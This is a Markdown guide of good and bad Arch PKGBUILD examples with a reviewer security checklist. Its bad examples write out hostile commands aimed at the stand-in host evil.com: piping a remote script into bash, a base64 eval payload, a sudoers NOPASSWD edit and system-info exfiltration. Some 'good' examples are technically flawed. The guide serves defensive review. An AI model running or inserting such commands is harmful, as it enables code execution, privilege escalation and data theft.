# PKGBUILD Examples

This document provides positive and negative examples of PKGBUILD patterns.

## Good Examples

### Example 1: Simple Application Package

```bash
#!/bin/bash
# PKGBUILD

pkgname=myapp
pkgver=1.2.3
pkgrel=1
arch=('x86_64' 'aarch64')
license=('MIT')
url="https://example.com/myapp"
source=("https://example.com/myapp-${pkgver}.tar.xz")
sha256sums=('a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456')

build() {
    cd "$srcdir/myapp-${pkgver}"
    make
}

package() {
    cd "$srcdir/myapp-${pkgver}"
    install -Dm755 myapp "$pkgdir/usr/bin/myapp"
    install -Dm644 README.md "$pkgdir/usr/share/doc/myapp/README.md"
}
```

**Why it's good:**
- ✅ Clear metadata (pkgname, pkgver, pkgrel, arch)
- ✅ HTTPS source URL
- ✅ SHA256 checksum provided
- ✅ Installs only to $pkgdir
- ✅ No network access in build()

### Example 2: VCS Package with Dynamic Version

```bash
#!/bin/bash
# PKGBUILD

pkgname=vcs-app
pkgver=()
pkgrel=1
arch=('x86_64')
url="https://github.com/user/vcs-app"
license=('GPL-3.0-only')

source=("https://github.com/user/vcs-app.git#tag=v${pkgver}")
sha256sums=()

pkgver() {
    git describe --tags --dirty --always
}

build() {
    cd "$srcdir"
    make
}

package() {
    cd "$srcdir"
    install -Dm755 app "$pkgdir/usr/bin/app"
}
```

**Why it's good:**
- ✅ Dynamic version from git tags
- ✅ No checksums needed for VCS (sha256sums=())
- ✅ Version function only reads from local clone

### Example 3: Python Package with Meson

```bash
#!/bin/bash
# PKGBUILD

pkgname=python-example
pkgver=2.0.0
pkgrel=1
arch=('x86_64')
license=('Apache-2.0')
depends=('python')
makedepends=('meson' 'python-setuptools')
source=("https://pypi.io/packages/source/example/example-${pkgver}.tar.gz")
sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')

build() {
    cd "$srcdir/example-${pkgver}"
    python -m pip install .
}

package() {
    cd "$srcdir/example-${pkgver}"
    python -m pip install --prefix="$pkgdir" .
}
```

**Why it's good:**
- ✅ Proper dependencies declared
- ✅ Uses standard Python packaging
- ✅ Installs to $pkgdir with correct prefix

## Bad Examples

### Example 1: Remote Code Execution

```bash
#!/bin/bash
# PKGBUILD - DANGEROUS!

pkgname=malicious-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
    curl -L https://evil.com/payload.sh | bash
}

package() {
    install -Dm755 payload "$pkgdir/usr/bin/payload"
}
```

**Why it's bad:**
- ❌ Downloads and executes remote code
- ❌ No checksum verification
- ❌ Installs outside $pkgdir
- ❌ CRITICAL: Remote code execution

### Example 2: Base64 Obfuscation

```bash
#!/bin/bash
# PKGBUILD - DANGEROUS!

pkgname=obfuscated-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
    eval "$(base64 -d <<< 'cGFja2FnZSgpIHsKICAgIGNsb3VkIC1PIC1zID4+IC91c...')"
}
```

**Why it's bad:**
- ❌ Obfuscated code via base64
- ❌ eval usage (dynamic code execution)
- ❌ Impossible to audit
- ❌ HIGH: Likely malicious payload

### Example 3: Checksum Bypass

```bash
#!/bin/bash
# PKGBUILD - DANGEROUS!

pkgname=unverified-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://suspicious.com/app"

source=("https://suspicious.com/app.tar.xz")
sha256sums=('SKIP')

build() {
    # No integrity verification
}
```

**Why it's bad:**
- ❌ SKIP bypasses integrity check
- ❌ Could be tampered with
- ❌ HIGH: No verification of source

### Example 4: Privilege Escalation

```bash
#!/bin/bash
# PKGBUILD - DANGEROUS!

pkgname=priv-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
    echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
}

package() {
    install -m4755 /tmp/rootbin "$pkgdir/usr/bin/rootbin"
}
```

**Why it's bad:**
- ❌ Modifies /etc/sudoers
- ❌ Installs SUID binary (m4755)
- ❌ CRITICAL: Root access escalation
- ❌ Modifies system files outside $pkgdir

### Example 5: Credential Exposure

```bash
#!/bin/bash
# PKGBUILD - DANGEROUS!

pkgname=cred-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

depends=('mysql://admin:supersecret123@localhost/db')

build() {
    export DB_PASS="supersecret123"
}
```

**Why it's bad:**
- ❌ Hard-coded credentials in depends
- ❌ Credentials in environment
- ❌ CRITICAL: Credential exposure

### Example 6: System Info Exfiltration

```bash
#!/bin/bash
# PKGBUILD - DANGEROUS!

pkgname=exfil-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
    curl -X POST https://evil.com/collect -d "$(uname -a)"
    curl -X POST https://evil.com/collect -d "$(hostname)"
}
```

**Why it's bad:**
- ❌ Sends system info to remote server
- ❌ CRITICAL: Data exfiltration
- ❌ No HTTPS verification

## Mixed Examples (Some Issues)

### Example 1: Insecure Transport

```bash
#!/bin/bash
# PKGBUILD - HAS ISSUES

pkgname=insecure-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

source=("http://example.com/app.tar.xz")
sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')

build() {
    curl -k https://insecure.com/extra -o extra.bin
}
```

**Issues:**
- ⚠️ HTTP source (no TLS)
- ⚠️ curl with -k flag (bypasses TLS)
- ⚠️ Downloads extra files at build time

### Example 2: Weak Checksums

```bash
#!/bin/bash
# PKGBUILD - HAS ISSUES

pkgname=weak-checksum
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

source=("https://example.com/app.tar.xz")
md5sums=('d41d8cd98f00b204e9800998ecf8427e')
```

**Issues:**
- ⚠️ MD5 is cryptographically weak
- ⚠️ Should use SHA256 or SHA512

### Example 3: Premature Service Activation

```bash
#!/bin/bash
# PKGBUILD - HAS ISSUES

pkgname=service-app
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

package() {
    install -Dm644 app "$pkgdir/usr/bin/app"
    systemctl enable app.service  # BAD: in package()
}
```

**Issues:**
- ⚠️ systemctl enable in package()
- ⚠️ Should be in post_install()

## Security Checklist for Reviewers

When reviewing a PKGBUILD, check for:

1. **Metadata**
   - [ ] pkgname matches directory
   - [ ] pkgver and pkgrel set
   - [ ] arch specified
   - [ ] License declared

2. **Sources**
   - [ ] All sources use HTTPS
   - [ ] Checksums provided for all sources
   - [ ] No SKIP entries (unless VCS)
   - [ ] No weak checksums (md5, sha1)

3. **Build Process**
   - [ ] No curl/wget | bash/sh
   - [ ] No eval usage
   - [ ] No base64 -d | bash
   - [ ] No python/perl -c execution
   - [ ] No network calls in build()

4. **Installation**
   - [ ] All installs to $pkgdir
   - [ ] No system file modifications
   - [ ] No SUID/SGID installation
   - [ ] No systemctl enable in build/package

5. **Dependencies**
   - [ ] No hard-coded credentials
   - [ ] No shadowing of packages
   - [ ] No removal of security tools

6. **Privileges**
   - [ ] No sudo/su/doas usage
   - [ ] No /etc modifications
   - [ ] No firewall rule changes
